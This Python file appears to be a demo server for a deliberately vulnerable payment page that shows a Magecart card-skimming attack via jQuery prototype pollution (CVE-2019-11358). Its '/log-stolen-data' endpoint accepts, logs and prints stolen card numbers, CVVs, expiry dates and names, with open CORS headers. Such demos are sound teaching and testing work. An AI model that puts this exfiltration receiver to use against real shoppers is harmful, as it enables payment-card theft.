#!/usr/bin/env python3
"""
Simple web server to serve the vulnerable payment page
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import json
import webbrowser
from threading import Timer
from datetime import datetime
from urllib.parse import urlparse, parse_qs

class PaymentPageHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        # Add CORS headers to allow cross-origin requests
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()
    
    def do_POST(self):
        """Handle POST requests for data exfiltration simulation"""
        if self.path == '/log-stolen-data':
            self.handle_stolen_data()
        else:
            super().do_POST()
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.end_headers()
    
    def handle_stolen_data(self):
        """Log stolen payment data to demonstrate the attack"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # Parse the stolen data
            stolen_data = json.loads(post_data.decode('utf-8'))
            
            # Add timestamp and attack info
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'attack_type': 'CVE-2019-11358 jQuery Prototype Pollution',
                'source_ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'stolen_data': stolen_data,
                'target_email': 'xyz031702@hotmail.com',  # Simulated target
                'attack_vector': 'jQuery $.extend() prototype pollution → XSS → data exfiltration'
            }
            
            # Create stolen_data directory if it doesn't exist
            os.makedirs('stolen_data_logs', exist_ok=True)
            
            # Log to file
            with open('stolen_data_logs/cve_2019_11358_attacks.log', 'a') as f:
                f.write(json.dumps(log_entry, indent=2) + '\n' + '='*80 + '\n')
            
            # Print to console for immediate visibility
            print(f"\n🚨 CVE-2019-11358 ATTACK DETECTED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print("=" * 80)
            print(f"💳 STOLEN PAYMENT DATA:")
            print(f"   Card Number: {stolen_data.get('cardNumber', 'N/A')}")
            print(f"   CVV: {stolen_data.get('cvv', 'N/A')}")
            print(f"   Expiry: {stolen_data.get('expiry', 'N/A')}")
            print(f"   Cardholder: {stolen_data.get('cardholderName', 'N/A')}")
            print(f"   Email: {stolen_data.get('email', 'N/A')}")
            print(f"📧 TARGET EMAIL: xyz031702@hotmail.com")
            print(f"🌐 SOURCE IP: {self.client_address[0]}")
            print(f"🕐 TIMESTAMP: {log_entry['timestamp']}")
            print("=" * 80)
            print("📁 Data logged to: stolen_data_logs/cve_2019_11358_attacks.log")
            print()
            
            # Send success response
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            response = {
                'status': 'success',
                'message': 'Payment data successfully exfiltrated',
                'timestamp': log_entry['timestamp'],
                'target': 'xyz031702@hotmail.com'
            }
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            print(f"Error handling stolen data: {e}")
            self.send_response(500)
            self.end_headers()

def run_payment_server(port=3000):
    """Start the web server for the vulnerable payment page"""
    # Change to the directory containing the payment files
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    
    server_address = ('', port)
    httpd = HTTPServer(server_address, PaymentPageHandler)
    
    print(f"🌐 VULNERABLE PAYMENT WEBSITE STARTED")
    print(f"🔗 URL: http://localhost:{port}/payment.html")
    print(f"💳 This is a VULNERABLE payment page for demonstration")
    print(f"⚠️  It contains a Magecart attack that steals payment data")
    print("\nPress Ctrl+C to stop the server\n")
    
    # Auto-open browser after a short delay
    def open_browser():
        webbrowser.open(f'http://localhost:{port}/payment.html')
    
    Timer(1.0, open_browser).start()
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Payment server stopped")
        httpd.server_close()

if __name__ == '__main__':
    run_payment_server()
